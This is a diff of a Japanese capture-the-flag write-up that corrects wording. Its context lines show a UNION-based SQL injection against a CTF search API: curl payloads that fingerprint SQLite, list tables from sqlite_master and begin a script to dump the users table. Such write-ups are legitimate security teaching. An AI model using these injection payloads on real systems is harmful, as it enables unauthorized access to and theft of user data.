@@ -12,7 +12,7 @@ $ curl "http://litelibrary.web.nitectf.live/api/search?q=_"
 [{"title":"Things Fall Apart","author":"Chinua Achebe","pages":"209","imageLink":"images/things-fall-apart.jpg","link":"https://en.wikipedia.org/wiki/Things_Fall_Apart"}]
 ```
 試しに`_`を送信すると先頭の本がヒットした。  
-内部でSQLが用いられていそうなので、SQLiを試す。  
+内部でDBが用いられていそうなので、SQLiを試す。  
 ```bash
 $ curl "http://litelibrary.web.nitectf.live/api/search?q=s'+UNION+SELECT+1,1,1,1,1;+--+s"
 [{"title":1,"author":1,"pages":1,"imageLink":1,"link":1}]
@@ -23,7 +23,7 @@ UNION-based SQLiが実行できる。
 $ curl "http://litelibrary.web.nitectf.live/api/search?q=s'+UNION+SELECT+sqlite_version(),1,1,1,1;+--+s"
 [{"title":"3.41.1","author":1,"pages":1,"imageLink":1,"link":1}]
 ```
-SQliteであるようだ。  
+SQLiteであるようだ。  
 テーブル名を取得する。  
 ```bash
 $ curl "http://litelibrary.web.nitectf.live/api/search?q=s'+UNION+SELECT+group_concat(tbl_name),1,1,1,1+FROM+sqlite_master+WHERE+type='table';+--+s"
@@ -39,7 +39,7 @@ $ curl "http://litelibrary.web.nitectf.live/api/search?q=s'+UNION+SELECT+1,group
 ```
 titleのチェックがあるのか、文字列が長いとBlindnessになってしまう。  
 authorで取得すればよい。  
-カラム名が分かったので以下のdump.pyで`users`を取得してやる(`dateCreated`は不要だと予測)。  
+カラム名が分かったので以下のdump.pyで`users`の中身をダンプしてやる(`dateCreated`は不要だと予測)。  
 ```python
 import requests
 
